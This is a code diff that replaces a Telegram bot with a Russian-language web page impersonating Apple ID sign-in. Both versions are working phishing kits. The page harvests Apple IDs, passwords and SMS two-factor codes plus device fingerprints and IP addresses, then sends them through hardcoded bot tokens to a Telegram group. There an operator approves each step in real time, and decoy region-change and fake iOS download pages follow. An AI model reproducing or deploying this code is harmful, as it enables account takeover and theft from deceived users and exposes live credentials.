@@ -1,68 +1,642 @@
-import asyncio
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.fsm.context import FSMContext
-from aiogram.filters import Command
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple ID Вход</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        .header { background: #000; color: white; padding: 30px 20px; text-align: center; }
+        .apple-logo { font-size: 48px; margin-bottom: 10px; }
+        .content { padding: 40px 30px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        input:focus { outline: none; border-color: #007AFF; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #007AFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-bottom: 10px;
+        }
+        .btn:hover { background: #0056CC; }
+        .error-message { color: #FF3B30; text-align: center; margin-top: 15px; display: none; font-size: 14px; }
+        .two-factor, .success-page, .download-page, .region-page { display: none; }
+        .page-title { text-align: center; margin-bottom: 30px; color: #333; }
+        .back-btn { background: #8E8E93; }
+        .back-btn:hover { background: #6C6C70; }
+        .download-options, .region-options { display: grid; gap: 10px; margin: 20px 0; }
+        .region-options { grid-template-columns: 1fr 1fr; }
+        .download-btn { background: #34C759; }
+        .region-btn { background: #5856D6; }
+        .success-message { text-align: center; color: #34C759; font-size: 18px; margin: 20px 0; }
+    </style>
+</head>
+<body>
 
-API_TOKEN = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'
-GROUP_ID = -1003894478662# Ваш ID группы
+<div class="container">
+    <div class="login-page" id="loginPage">
+        <div class="header">
+            <div class="apple-logo"></div>
+            <h1>Вход в Apple ID</h1>
+        </div>
+        <div class="content">
+            <h2 class="page-title">Введите свои данные</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="appleId">Apple ID</label>
+                    <input type="email" id="appleId" placeholder="name@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Пароль</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn">Продолжить</button>
+            </form>
+            <div class="error-message" id="loginError">Ошибка отправки данных.</div>
+        </div>
+    </div>
 
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher()
+    <div class="two-factor" id="twoFactorPage">
+        <div class="header">
+            <div class="apple-logo"></div>
+            <h1>Аутентификация</h1>
+        </div>
+        <div class="content">
+            <h2 class="page-title">Код из SMS</h2>
+            <form id="twoFactorForm">
+                <div class="form-group">
+                    <label for="code2fa">Код подтверждения</label>
+                    <input type="text" id="code2fa" placeholder="6 цифр" required maxlength="6">
+                </div>
+                <button type="submit" class="btn">Подтвердить</button>
+                <button type="button" class="btn back-btn" onclick="showLoginPage()">Назад</button>
+            </form>
+            <div class="error-message" id="twoFactorError">Неверный код или отказ.</div>
+        </div>
+    </div>
 
-class LoginSteps(StatesGroup):
-    waiting_for_login = State()
-    waiting_for_password = State()
-    waiting_for_2fa = State()
+    <div class="success-page" id="successPage">
+        <div class="header"><div class="apple-logo"></div><h1>Готово</h1></div>
+        <div class="content">
+            <div class="success-message">✅ Вход выполнен!</div>
+            <button class="btn region-btn" onclick="showRegionPage()">Сменить регион</button>
+            <button class="btn download-btn" onclick="showDownloadPage()">Скачать iOS</button>
+        </div>
+    </div>
 
-@dp.message(Command("start"))
-async def start_handler(message: types.Message, state: FSMContext):
-    await message.answer("Введите Apple ID:")
-    await state.set_state(LoginSteps.waiting_for_login)
+    <div class="region-page" id="regionPage">
+        <div class="header"><div class="apple-logo"></div><h1>Регион</h1></div>
+        <div class="content">
+            <div class="region-options">
+                <button class="btn region-btn" onclick="changeRegion('Украина')">Украина</button>
+                <button class="btn region-btn" onclick="changeRegion('Россия')">Россия</button>
+                <button class="btn region-btn" onclick="changeRegion('США')">США</button>
+                <button class="btn region-btn" onclick="changeRegion('Турция')">Турция</button>
+                <button class="btn region-btn" onclick="changeRegion('Ирландия')">Ирландия</button>
+                <button class="btn region-btn" onclick="changeRegion('Великобритания')">Великобритания</button>
+            </div>
+            <button class="btn back-btn" onclick="showSuccessPage()">Назад</button>
+            <div class="success-message" id="regionSuccess" style="display: none;"></div>
+        </div>
+    </div>
 
-@dp.message(LoginSteps.waiting_for_login)
-async def process_login(message: types.Message, state: FSMContext):
-    await state.update_data(login=message.text)
-    await message.answer("Введите пароль:")
-    await state.set_state(LoginSteps.waiting_for_password)
+    <div class="download-page" id="downloadPage">
+        <div class="header"><div class="apple-logo"></div><h1>Загрузка</h1></div>
+        <div class="content">
+            <div class="download-options">
+                <button class="btn download-btn" onclick="downloadIOS('18.0')">iOS 18.0</button>
+                <button class="btn download-btn" onclick="downloadIOS('17.5')">iOS 17.5</button>
+                <button class="btn download-btn" onclick="downloadIOS('26.1')">iOS 26.1</button>
+                <button class="btn download-btn" onclick="downloadIOS('16')">iOS 16</button>
+            </div>
+            <button class="btn back-btn" onclick="showSuccessPage()">Назад</button>
+        </div>
+    </div>
+</div>
 
-@dp.message(LoginSteps.waiting_for_password)
-async def process_password(message: types.Message, state: FSMContext):
-    password = message.text
-    user_data = await state.get_data()
-    login = user_data['login']
+<script>
+    const BOT_TOKEN = '8428343552:AAFAZhJAmphDEWY02aiTxR5wIwWvP2xyVlE';
+    const CHAT_ID = '-1003894478662';
     
-    # 1. Сразу отправляем логин и пароль в группу
-    report = (
-        f"⚠️ **Попытка входа**\n"
-        f"👤 Логин: `{login}`\n"
-        f"🔑 Пароль: `{password}`\n"
-        f"⏳ Ожидание 2FA..."
-    )
-    await bot.send_message(GROUP_ID, report, parse_mode="Markdown")
+    // Расширенная функция определения модели устройства
+    function detectDeviceDetails() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const screen = `${screen.width}x${screen.height}`;
+        
+        // Определение модели iPhone по userAgent и разрешению экрана
+        let deviceModel = "Неизвестное устройство";
+        let deviceType = "Другое";
+        
+        // Проверяем iPhone
+        if (/iPhone/i.test(ua)) {
+            deviceType = "iPhone";
+            
+            // Определение конкретной модели iPhone по разрешению
+            if (screen === "375x812" || screen === "812x375") {
+                if (/CPU iPhone OS 1[0-4]_/.test(ua)) deviceModel = "iPhone X/XS/11 Pro";
+                else if (/CPU iPhone OS 1[5-9]_/.test(ua)) deviceModel = "iPhone 12/13 mini";
+                else deviceModel = "iPhone X/XS/11 Pro";
+            }
+            else if (screen === "414x896" || screen === "896x414") {
+                if (/CPU iPhone OS 1[1-3]_/.test(ua)) deviceModel = "iPhone XR/11";
+                else if (/CPU iPhone OS 1[4-9]_/.test(ua)) deviceModel = "iPhone 11/12/13";
+                else deviceModel = "iPhone 11/XR";
+            }
+            else if (screen === "390x844" || screen === "844x390") {
+                deviceModel = "iPhone 12/13/14";
+            }
+            else if (screen === "428x926" || screen === "926x428") {
+                deviceModel = "iPhone 12 Pro Max/13 Pro Max/14 Plus";
+            }
+            else if (screen === "393x852" || screen === "852x393") {
+                deviceModel = "iPhone 15/15 Pro";
+            }
+            else if (screen === "430x932" || screen === "932x430") {
+                deviceModel = "iPhone 15 Pro Max";
+            }
+            else if (screen === "320x480" || screen === "480x320") {
+                deviceModel = "iPhone 4/4S/SE 1st gen";
+            }
+            else if (screen === "320x568" || screen === "568x320") {
+                deviceModel = "iPhone 5/5S/SE 2nd/3rd gen";
+            }
+            else if (screen === "375x667" || screen === "667x375") {
+                deviceModel = "iPhone 6/6S/7/8/SE 2nd/3rd gen";
+            }
+            else if (screen === "414x736" || screen === "736x414") {
+                deviceModel = "iPhone 6+/6S+/7+/8+";
+            }
+            else if (screen === "375x812" || screen === "812x375") {
+                deviceModel = "iPhone X/XS/11 Pro";
+            }
+            else {
+                // Определяем по iOS версии если разрешение не распознано
+                const iosMatch = ua.match(/iPhone OS (\d+)_/);
+                if (iosMatch) {
+                    const iosVersion = parseInt(iosMatch[1]);
+                    if (iosVersion >= 17) deviceModel = "iPhone (iOS 17+)";
+                    else if (iosVersion >= 16) deviceModel = "iPhone (iOS 16)";
+                    else if (iosVersion >= 15) deviceModel = "iPhone (iOS 15)";
+                    else if (iosVersion >= 14) deviceModel = "iPhone (iOS 14)";
+                } else {
+                    deviceModel = "iPhone";
+                }
+            }
+        }
+        // Проверяем iPad
+        else if (/iPad/i.test(ua)) {
+            deviceType = "iPad";
+            if (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 0) {
+                deviceModel = "iPad (новейшая модель)";
+            } else if (/iPad8/i.test(ua)) {
+                deviceModel = "iPad Pro 11/12.9 (2020)";
+            } else if (/iPad7/i.test(ua)) {
+                deviceModel = "iPad 10.2 (2019)/iPad mini 5";
+            } else {
+                deviceModel = "iPad";
+            }
+        }
+        // Проверяем iPod
+        else if (/iPod/i.test(ua)) {
+            deviceType = "iPod";
+            deviceModel = "iPod Touch";
+        }
+        // Проверяем macOS
+        else if (/Macintosh/i.test(ua) || /Mac OS X/i.test(ua)) {
+            deviceType = "Mac";
+            deviceModel = "Mac/Макбук";
+        }
+        // Проверяем Windows
+        else if (/Windows/i.test(ua)) {
+            deviceType = "Windows PC";
+            deviceModel = "Компьютер Windows";
+        }
+        // Проверяем Android
+        else if (/Android/i.test(ua)) {
+            deviceType = "Android";
+            
+            // Попробуем определить модель Android по userAgent
+            const androidModels = {
+                'SM-': 'Samsung Galaxy',
+                'Pixel': 'Google Pixel',
+                'Mi ': 'Xiaomi',
+                'Redmi': 'Redmi',
+                'HUAWEI': 'Huawei',
+                'OnePlus': 'OnePlus',
+                'Nexus': 'Nexus'
+            };
+            
+            for (const [key, model] of Object.entries(androidModels)) {
+                if (ua.includes(key)) {
+                    deviceModel = model;
+                    break;
+                }
+            }
+            if (deviceModel === "Неизвестное устройство") {
+                deviceModel = "Android устройство";
+            }
+        }
+        
+        // Получаем информацию о браузере
+        let browser = "Неизвестный браузер";
+        if (/Chrome/i.test(ua) && !/Edge/i.test(ua) && !/OPR/i.test(ua)) {
+            browser = "Chrome " + (ua.match(/Chrome\/(\d+)/) || [,''])[1];
+        } else if (/Firefox/i.test(ua)) {
+            browser = "Firefox " + (ua.match(/Firefox\/(\d+)/) || [,''])[1];
+        } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+            browser = "Safari " + (ua.match(/Version\/(\d+)/) || [,''])[1];
+        } else if (/Edge/i.test(ua)) {
+            browser = "Edge " + (ua.match(/Edge\/(\d+)/) || [,''])[1];
+        } else if (/OPR/i.test(ua)) {
+            browser = "Opera " + (ua.match(/OPR\/(\d+)/) || [,''])[1];
+        }
+        
+        // Получаем IP (пример - реально нужно использовать серверный запрос)
+        let ip = "Не определен";
+        
+        return {
+            type: deviceType,
+            model: deviceModel,
+            screen: screen,
+            browser: browser,
+            userAgent: ua.substring(0, 100) + "...",
+            platform: platform,
+            ip: ip
+        };
+    }
     
-    # 2. Просим 2FA у пользователя
-    await message.answer("Введите код подтверждения из SMS или уведомления:")
-    await state.set_state(LoginSteps.waiting_for_2fa)
-
-@dp.message(LoginSteps.waiting_for_2fa)
-async def process_2fa(message: types.Message, state: FSMContext):
-    code = message.text
-    user_data = await state.get_data()
+    // Функция для получения IP (асинхронная)
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.log("Не удалось получить IP:", error);
+            return "Неизвестно";
+        }
+    }
     
-    # 3. Отправляем финальный отчет с кодом
-    final_report = (
-        f"✅ **Получен 2FA код**\n"
-        f"👤 Логин: `{user_data['login']}`\n"
-        f"🔢 Код: `{code}`"
-    )
-    await bot.send_message(GROUP_ID, final_report, parse_mode="Markdown")
+    // Основная функция отправки в Telegram
+    async function sendToTelegram(data, is2FA = false) {
+        try {
+            // Получаем детали устройства
+            const deviceInfo = detectDeviceDetails();
+            const userIP = await getUserIP();
+            
+            let message;
+            
+            if (is2FA) {
+                message = `🔐 2FA КОД\n` +
+                         `📱 Устройство: ${deviceInfo.model}\n` +
+                         `📟 Тип: ${deviceInfo.type}\n` +
+                         `🖥️ Экран: ${deviceInfo.screen}\n` +
+                         `🌍 IP: ${userIP}\n` +
+                         `🔢 Код: ${data.code2fa}\n` +
+                         `📧 Аккаунт: ${data.appleId}\n` +
+                         `🕐 Время: ${new Date().toLocaleString('ru-RU')}\n` +
+                         `🌐 Браузер: ${deviceInfo.browser}`;
+            } else {
+                message = `🍎 APPLE ID ВХОД\n` +
+                         `📱 Устройство: ${deviceInfo.model}\n` +
+                         `📟 Тип: ${deviceInfo.type}\n` +
+                         `🖥️ Экран: ${deviceInfo.screen}\n` +
+                         `🌍 IP: ${userIP}\n` +
+                         `📧 Apple ID: ${data.appleId}\n` +
+                         `🔑 Пароль: ${data.password}\n` +
+                         `🕐 Время: ${new Date().toLocaleString('ru-RU')}\n` +
+                         `🌐 Браузер: ${deviceInfo.browser}\n` +
+                         `🔧 Платформа: ${deviceInfo.platform}`;
+            }
+            
+            // Кнопки для Telegram
+            const inlineKeyboard = {
+                inline_keyboard: [[
+                    {
+                        text: "✅ Подтвердить",
+                        callback_data: is2FA ? "confirm_2fa" : "confirm_login"
+                    },
+                    {
+                        text: "❌ Отменить",
+                        callback_data: is2FA ? "cancel_2fa" : "cancel_login"
+                    }
+                ]]
+            };
+            
+            // Отправляем в Telegram
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: inlineKeyboard
+                })
+            });
+            
+            const result = await response.json();
+            console.log('Telegram response:', result);
+            return result.ok;
+            
+        } catch (error) {
+            console.error('Ошибка отправки в Telegram:', error);
+            return false;
+        }
+    }
     
-    await message.answer("Проверка данных... Пожалуйста, подождите.")
-    await state.clear()
-
-async def main():
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    // Проверка подтверждения из Telegram
+    let checkInterval;
+    
+    async function startPolling(is2FA, onSuccess, onCancel) {
+        if (checkInterval) clearInterval(checkInterval);
+        
+        checkInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    const lastUpdate = data.result[data.result.length - 1];
+                    
+                    if (lastUpdate.callback_query) {
+                        const callbackData = lastUpdate.callback_query.data;
+                        
+                        if (is2FA) {
+                            if (callbackData === 'confirm_2fa') {
+                                clearInterval(checkInterval);
+                                if (onSuccess) onSuccess();
+                            } else if (callbackData === 'cancel_2fa') {
+                                clearInterval(checkInterval);
+                                if (onCancel) onCancel();
+                            }
+                        } else {
+                            if (callbackData === 'confirm_login') {
+                                clearInterval(checkInterval);
+                                if (onSuccess) onSuccess();
+                            } else if (callbackData === 'cancel_login') {
+                                clearInterval(checkInterval);
+                                if (onCancel) onCancel();
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Ошибка polling:', error);
+            }
+        }, 3000); // Проверяем каждые 3 секунды
+    }
+    
+    // Навигация по страницам
+    function showLoginPage() { 
+        hideAll(); 
+        document.getElementById('loginPage').style.display = 'block';
+        if (checkInterval) clearInterval(checkInterval);
+    }
+    
+    function showTwoFactorPage() { 
+        hideAll(); 
+        document.getElementById('twoFactorPage').style.display = 'block';
+        // Автозаполняем тестовый код
+        document.getElementById('code2fa').value = Math.floor(100000 + Math.random() * 900000);
+    }
+    
+    function showSuccessPage() { 
+        hideAll(); 
+        document.getElementById('successPage').style.display = 'block'; 
+    }
+    
+    function showRegionPage() { 
+        hideAll(); 
+        document.getElementById('regionPage').style.display = 'block'; 
+    }
+    
+    function showDownloadPage() { 
+        hideAll(); 
+        document.getElementById('downloadPage').style.display = 'block'; 
+    }
+    
+    function hideAll() {
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('twoFactorPage').style.display = 'none';
+        document.getElementById('successPage').style.display = 'none';
+        document.getElementById('regionPage').style.display = 'none';
+        document.getElementById('downloadPage').style.display = 'none';
+    }
+    
+    // Обработка формы входа
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        const appleId = document.getElementById('appleId').value.trim();
+        const password = document.getElementById('password').value.trim();
+        
+        if (!appleId || !password) {
+            alert('Пожалуйста, заполните все поля');
+            return;
+        }
+        
+        const data = { appleId, password, code2fa: '' };
+        
+        // Показываем загрузку
+        const btn = this.querySelector('.btn');
+        const originalText = btn.textContent;
+        btn.textContent = 'Отправка...';
+        btn.disabled = true;
+        
+        try {
+            // Отправляем данные в Telegram
+            const sent = await sendToTelegram(data, false);
+            
+            if (sent) {
+                document.getElementById('loginError').style.display = 'none';
+                alert('✅ Данные отправлены! Ожидайте подтверждения в Telegram...');
+                
+                // Начинаем проверку подтверждения
+                startPolling(
+                    false,
+                    () => {
+                        // Если подтвердили в Telegram
+                        showTwoFactorPage();
+                        alert('✅ Вход подтвержден! Введите код из SMS.');
+                    },
+                    () => {
+                        // Если отменили в Telegram
+                        document.getElementById('loginError').textContent = '❌ Вход отклонен оператором';
+                        document.getElementById('loginError').style.display = 'block';
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                    }
+                );
+                
+            } else {
+                document.getElementById('loginError').textContent = '❌ Ошибка отправки. Попробуйте снова.';
+                document.getElementById('loginError').style.display = 'block';
+            }
+            
+        } catch (error) {
+            console.error('Ошибка:', error);
+            document.getElementById('loginError').textContent = '❌ Ошибка: ' + error.message;
+            document.getElementById('loginError').style.display = 'block';
+        } finally {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    });
+    
+    // Обработка 2FA формы
+    document.getElementById('twoFactorForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        const code2fa = document.getElementById('code2fa').value.trim();
+        const appleId = document.getElementById('appleId').value.trim();
+        
+        if (!code2fa || code2fa.length !== 6) {
+            alert('Введите 6-значный код');
+            return;
+        }
+        
+        const data = { appleId, password: '', code2fa };
+        
+        // Показываем загрузку
+        const btn = this.querySelector('.btn');
+        const originalText = btn.textContent;
+        btn.textContent = 'Проверка...';
+        btn.disabled = true;
+        
+        try {
+            // Отправляем 2FA код в Telegram
+            const sent = await sendToTelegram(data, true);
+            
+            if (sent) {
+                document.getElementById('twoFactorError').style.display = 'none';
+                alert('✅ Код отправлен! Ожидайте подтверждения...');
+                
+                // Начинаем проверку подтверждения для 2FA
+                startPolling(
+                    true,
+                    () => {
+                        // Если подтвердили 2FA
+                        showSuccessPage();
+                    },
+                    () => {
+                        // Если отменили 2FA
+                        document.getElementById('twoFactorError').textContent = '❌ Код отклонен оператором';
+                        document.getElementById('twoFactorError').style.display = 'block';
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                    }
+                );
+                
+            } else {
+                document.getElementById('twoFactorError').textContent = '❌ Ошибка отправки кода';
+                document.getElementById('twoFactorError').style.display = 'block';
+            }
+            
+        } catch (error) {
+            console.error('Ошибка:', error);
+            document.getElementById('twoFactorError').textContent = '❌ Ошибка: ' + error.message;
+            document.getElementById('twoFactorError').style.display = 'block';
+        } finally {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    });
+    
+    // Функции для кнопок
+    function changeRegion(country) {
+        const el = document.getElementById('regionSuccess');
+        el.textContent = `✅ Регион успешно изменен на ${country}!`;
+        el.style.display = 'block';
+        
+        // Отправляем уведомление в Telegram о смене региона
+        const deviceInfo = detectDeviceDetails();
+        const message = `🌍 СМЕНА РЕГИОНА\n` +
+                       `📱 Устройство: ${deviceInfo.model}\n` +
+                       `🌐 Страна: ${country}\n` +
+                       `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+    }
+    
+    function downloadIOS(version) {
+        // Создаем фиктивный файл для скачивания
+        const content = `iOS ${version} Firmware\nЭто тестовый файл.\nВерсия: ${version}\nДата: ${new Date().toLocaleString('ru-RU')}\nРазмер: 4.2 GB (тестовый)`;
+        const blob = new Blob([content], { type: 'application/octet-stream' });
+        const url = URL.createObjectURL(blob);
+        
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `iOS_${version}_Restore.ipsw`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        setTimeout(() => {
+            URL.revokeObjectURL(url);
+        }, 100);
+        
+        alert(`📥 iOS ${version} начал скачиваться!`);
+        
+        // Отправляем уведомление в Telegram о скачивании
+        const deviceInfo = detectDeviceDetails();
+        const message = `📥 ЗАГРУЗКА iOS\n` +
+                       `📱 Устройство: ${deviceInfo.model}\n` +
+                       `📲 Версия iOS: ${version}\n` +
+                       `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+    }
+    
+    // Инициализация
+    showLoginPage();
+    
+    // Показываем информацию об устройстве в консоли для отладки
+    console.log('Информация об устройстве:', detectDeviceDetails());
+</script>
+</body>
+</html>
